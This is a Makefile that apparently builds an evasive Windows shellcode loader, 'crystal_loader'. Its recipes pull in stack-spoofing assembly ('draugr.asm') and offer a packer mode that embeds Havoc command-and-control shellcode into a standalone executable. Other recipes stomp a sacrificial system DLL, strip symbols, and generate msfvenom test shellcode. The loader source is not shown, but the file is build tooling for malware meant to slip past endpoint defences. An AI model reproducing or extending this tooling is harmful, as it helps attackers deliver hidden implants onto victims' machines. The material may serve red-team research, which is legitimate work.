CC     = x86_64-w64-mingw32-g++
NASM   = nasm
CFLAGS = -Wall -O2 -std=c++17 -Wno-pointer-arith
LFLAGS =

TARGET = crystal_loader.exe
SRCS   = crystal_loader.cpp spoof.cpp
ASM    = draugr.asm
OBJ    = draugr.obj

# --- file-based mode (shellcode as argument) ---
all: $(TARGET)

$(OBJ): $(ASM)
	$(NASM) -f win64 $< -o $@

$(TARGET): $(SRCS) $(OBJ)
	$(CC) $(CFLAGS) $(SRCS) $(OBJ) -o $@ $(LFLAGS)

# --- packer mode (single self-contained .exe) ---
# Usage: python3 packer.py <shellcode.bin> -o bicho.exe
#
# Or manually:
#   make embed BIN=havoc.bin OUT=bicho.exe
embed: $(OBJ)
ifndef BIN
	$(error BIN not set. Usage: make embed BIN=shellcode.bin OUT=output.exe)
endif
	python3 packer.py $(BIN) -o $(or $(OUT),loader.exe)

# Override sacrificial DLL at compile time:
#   make STOMP=C:\\Windows\\System32\\xpsservices.dll
#   python3 packer.py havoc.bin -o bicho.exe -d "C:\\Windows\\System32\\xpsservices.dll"
ifdef STOMP
CFLAGS += -DSTOMP_DLL=L\"$(STOMP)\"
endif

# Strip symbols for smaller binary
release: $(SRCS) $(OBJ)
	$(CC) $(CFLAGS) -s $(SRCS) $(OBJ) -o $(TARGET) $(LFLAGS)

clean:
	rm -f $(OBJ) $(TARGET) payload.h

# Generate test shellcode (requires msfvenom)
shellcode:
	msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin

.PHONY: all release clean shellcode embed
